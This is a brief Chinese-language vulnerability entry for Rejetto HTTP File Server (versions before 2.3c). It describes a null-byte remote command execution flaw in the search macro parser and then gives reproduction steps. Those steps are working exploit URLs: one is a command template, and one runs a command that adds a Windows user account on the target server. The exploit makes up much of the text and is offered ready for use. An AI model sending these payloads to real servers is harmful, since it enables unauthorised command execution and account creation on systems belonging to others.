Hfs 远程命令执行漏洞
====================

一、漏洞简介
------------

Rejetto HTTP File Server
2.3c及之前版本中的parserLib.pas文件中的'findMacroMarker'函数中存在安全漏洞，该漏洞源于parserLib.pas文件没有正确处理空字节。远程攻击者可借助搜索操作中的'%00'序列利用该漏洞执行任意程序。

二、漏洞影响
------------

2.3c以前的2.3x版本

三、复现过程
------------

    http://www.0-sec.org:8080/?search==%00{.exec|cmd.exe /c [Command-String].}
    http://www.0-sec.org:8080/?search==%00{.exec|cmd.exe /c net user test1234 1234 /add.}
